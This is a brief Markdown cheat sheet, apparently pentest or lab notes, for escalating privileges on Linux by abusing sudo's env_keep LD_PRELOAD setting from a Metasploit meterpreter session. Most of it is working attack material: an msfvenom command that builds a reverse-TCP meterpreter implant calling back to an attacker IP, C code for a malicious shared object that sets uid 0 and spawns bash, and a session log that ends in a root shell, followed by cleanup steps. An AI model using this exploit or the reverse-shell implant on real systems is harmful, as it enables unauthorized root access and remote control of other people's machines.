# Metasploit

## 01 - Detect

```
meterpreter > execute -if sudo -a "-l"
Process 2673 created.
Channel 23 created.
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
..[omitted]..
```

## 02 - Exploit

```
meterpreter > mkdir exploit
Creating directory: exploit
```

### 2.1 - Generate an implant via `msfvenom`

TODO: Show the steps when using `LD_PRELOAD` for escalating privileges.

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=443 -f elf-so -o implant.so

meterpreter > upload implant.so exploit/
```

### 2.2 - Compile the implant

```
meterpreter > cd exploit/
meterpreter > edit shell.c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
meterpreter > execute -if gcc -a "-fPIC -shared -o shell.so shell.c -nostartfiles"
Process 2698 created.
Channel 25 created.
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2710 created.
Channel 26 created.
cd exploit
user@debian:~/exploit$ sudo LD_PRELOAD=~/exploit/shell.so apache2
root@debian:/home/user# id
id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# exit
exit
exit
apache2: bad user name ${APACHE_RUN_USER}
user@debian:~$ exit
exit
exit
```

## 03 - Cleanup

```
meterpreter > cd ..
meterpreter > rmdir exploit/
Removing directory: exploit/
```